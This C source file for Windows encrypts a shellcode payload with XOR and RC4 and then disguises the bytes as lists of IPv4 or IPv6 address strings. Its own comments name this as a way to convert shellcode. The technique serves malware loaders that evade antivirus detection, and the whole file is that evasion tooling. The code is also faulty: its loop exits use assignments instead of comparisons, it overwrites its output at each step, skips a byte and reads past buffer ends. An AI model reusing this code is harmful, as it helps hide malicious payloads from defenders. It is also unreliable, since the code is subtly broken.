
// this will define encrypt functions and obfuscation methods applied on the payload

#include "encrypt_func.h"

void xorEncryption(PBYTE pPayloadBuf, DWORD bPayloadSize, const char *key, DWORD key_len) {

	for (DWORD i = 0; i < bPayloadSize; i++) {
		pPayloadBuf[i] = pPayloadBuf[i] ^ key[i % key_len]; // will cycle through the key to encrypt the payload
	}
}

void rc4Encryption(PBYTE PayloadBuf, DWORD bPayloadSize, const char *key, DWORD key_len) {
	
	DWORD S[256];
	for (DWORD i = 0; i < 256; i++) {
		S[i] = i;
	}

	DWORD j = 0;
	for (DWORD i=0; i < 256; i++) {
		j = (j + S[i] + key[i % key_len]) % 256;
		DWORD temp = S[i];
		S[i] = S[j];
		S[j] = temp;
	}

	DWORD i = 0; j = 0;
	for (DWORD itr = 0; itr < bPayloadSize; itr++) {
		i = (i + 1) % 256;
		j = (j + S[i]) % 256;

		DWORD temp = S[i];
		S[i] = S[j];
		S[j] = temp;

		BYTE K = S[(S[i] + S[j]) % 256];
		PayloadBuf[itr] = PayloadBuf[itr] ^ K;
	}
	
}

BOOL paddBufferIpv4(PBYTE input_buf, DWORD input_buf_size, PBYTE* output_padded_buf, SIZE_T* output_padded_buf_size) {
	PBYTE pad_buf = NULL;
	SIZE_T padded_size = 0;

	padded_size = input_buf_size + 4 - (input_buf_size % 4);

	pad_buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, padded_size);
	if (!pad_buf) {
		return FALSE;
	}

	ZeroMemory(pad_buf, padded_size);
	memcpy(pad_buf, input_buf, input_buf_size);

	*output_padded_buf = pad_buf;
	*output_padded_buf_size = padded_size;

	return TRUE;
}

char* generateIpv4(int a, int b, int c, int d) {

	char* output = malloc(32*sizeof(unsigned char));
	if (output == NULL) {
		fprintf(stderr, "cannot allocate memory (%d)\n", GetLastError());
		return NULL;
	}

	sprintf(output, "%d.%d.%d.%d", a, b, c, d); // we basically use this function so that we can convert shell code to decimal
	return output; 
}

PBYTE ipv4Obfuscation(PBYTE payload_buf, DWORD payload_buf_size, PBYTE obfuscated_payload, DWORD obfuscated_payload_size) {
	if (payload_buf_size % 4 != 0) {
		PBYTE output_padded_buf = NULL;
		SIZE_T padded_size = 0;
		paddBufferIpv4(payload_buf, payload_buf_size, &output_padded_buf, &padded_size);

		int c = 4; int counter = 0;
		char* IPv4 = NULL;
		
		obfuscated_payload_size = 4*padded_size;
		obfuscated_payload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, obfuscated_payload_size);

		if (obfuscated_payload == NULL) {
			fprintf(stderr, "cannot allocate memory for obfuscated payload (%d)\n", GetLastError());
			return NULL;
		}
		// ipv4 obfuscation will increase the size of the given shellcode by 4 times in worst case scenario 

		for (int i = 0; i < padded_size; i++) {
			if (c == 4) {
				counter++;

				IPv4 = generateIpv4(output_padded_buf[i], output_padded_buf[i+1], output_padded_buf[i+2], output_padded_buf[i+3]);

				if (IPv4 == NULL) {
					return NULL;
				}
				
				memcpy(obfuscated_payload, IPv4, 32);

				if (i = padded_size - 4) {
					free(IPv4);
					break;
				}

				c = 1;

			} else {
				c++;
			}
		}
		
	} else {
		int c = 4; int counter = 0;
		char* IPv4 = NULL;

		obfuscated_payload_size = 3*payload_buf_size;
		obfuscated_payload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, obfuscated_payload_size);

		if (obfuscated_payload == NULL) {
			fprintf(stderr, "cannot allocate memory for obfuscated payload (%d)\n", GetLastError());
			return NULL;
		}
		
		for (int i = 0; i < payload_buf_size; i++) {
			if (c == 4) {
				counter++;

				IPv4 = generateIpv4(payload_buf[i], payload_buf[i+1], payload_buf[i+2], payload_buf[i+3]);
				
				if (IPv4 == NULL) {
					return NULL;
				}

				memcpy(obfuscated_payload, IPv4, 32);

				if (i = payload_buf_size - 4) {
					free(IPv4);
					break;
				}

				c = 1;
			} else {
				c++;
			}
		}
	}

	return obfuscated_payload;
}



BOOL paddBufferIpv6(PBYTE input_buf, DWORD input_buf_size, PBYTE* output_padded_buf, SIZE_T* output_padded_buf_size) {
	PBYTE pad_buf = NULL;
	SIZE_T padded_size = 0;

	padded_size = input_buf_size + 16 - (input_buf_size % 16);

	pad_buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, padded_size);
	if (!pad_buf) {
		return FALSE;
	}

	ZeroMemory(pad_buf, padded_size);
	memcpy(pad_buf, input_buf, input_buf_size);

	*output_padded_buf = pad_buf;
	*output_padded_buf_size = padded_size;

	return TRUE;
}

char* generateIpv6(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {
	char output0[32], output1[32], output2[32], output3[32];

	char* result = malloc(128*sizeof(char));
	if (result == NULL) {
		fprintf(stderr, "cannot allocate memory (%d)\n", GetLastError());
		return NULL;
	}

	sprintf(output0, "%0.2x%0.2x%0.2x%0.2x", a, b, c, d);
	sprintf(output1, "%0.2x%0.2x%0.2x%0.2x", e, f, g, h);
	sprintf(output2, "%0.2x%0.2x%0.2x%0.2x", i, j, k, l);
	sprintf(output3, "%0.2x%0.2x%0.2x%0.2x", m, n, o, p);

	sprintf(result, "%s:%s:%s:%s", output0, output1, output2, output3);

	return result;
}

PBYTE ipv6Obfuscation(PBYTE payload_buf, DWORD payload_buf_size, PBYTE obfuscated_payload, DWORD obfuscated_payload_size) {

	if (payload_buf_size % 16 != 0) {
		PBYTE output_padded_buf = NULL;
		SIZE_T padded_size = 0;
		paddBufferIpv6(payload_buf, payload_buf_size, &output_padded_buf, &padded_size);

		int c = 16; int counter = 0;
		char* IPv6 = NULL;
		
		obfuscated_payload_size = 3*padded_size;
		obfuscated_payload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, obfuscated_payload_size);

		if (obfuscated_payload == NULL) {
			fprintf(stderr, "cannot allocate memory for obfuscated payload (%d)\n", GetLastError());
			return NULL;
		}
		// ipv6 obfuscation will increase the size of the given shellcode by 3 times

		for (int i = 0; i < padded_size; i++) {
			if (c == 16) {
				counter++;

				IPv6 = generateIpv6(output_padded_buf[i], output_padded_buf[i+1], output_padded_buf[i+2], output_padded_buf[i+3],
						     output_padded_buf[i+4], output_padded_buf[i+5], output_padded_buf[i+6], output_padded_buf[i+7],
						     output_padded_buf[i+8], output_padded_buf[i+9], output_padded_buf[i+10], output_padded_buf[i+11], 
						     output_padded_buf[i+12], output_padded_buf[i+13], output_padded_buf[i+15], output_padded_buf[i+16]); 

				if (IPv6 == NULL) {
					return NULL;
				}

				memcpy(obfuscated_payload, IPv6, 128);

				if (i = padded_size - 16) { 
					free(IPv6);
					break;
				}

				c = 1;

			} else {
				c++;
			}
		}

	} else {
		int c = 16; int counter = 0;
		char* IPv6 = NULL;

		obfuscated_payload_size = 3*payload_buf_size;
		obfuscated_payload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, obfuscated_payload_size);

		for (int i = 0; i < payload_buf_size; i++) {
			if (c == 16) {
				counter++;

				IPv6 = generateIpv6(payload_buf[i], payload_buf[i+1], payload_buf[i+2], payload_buf[i+3],
						     payload_buf[i+4], payload_buf[i+5], payload_buf[i+6], payload_buf[i+7],
						     payload_buf[i+8], payload_buf[i+9], payload_buf[i+10], payload_buf[i+11], 
						     payload_buf[i+12], payload_buf[i+13], payload_buf[i+15], payload_buf[i+16]); 
				
				if (IPv6 == NULL) {
					return NULL;
				}

				memcpy(obfuscated_payload, IPv6, 128);

				if (i = payload_buf_size - 16) {
					free(IPv6);
					break;
				}

				c = 1;
			} else {
				c++;
			}
		}
	}
	
	return obfuscated_payload;

}

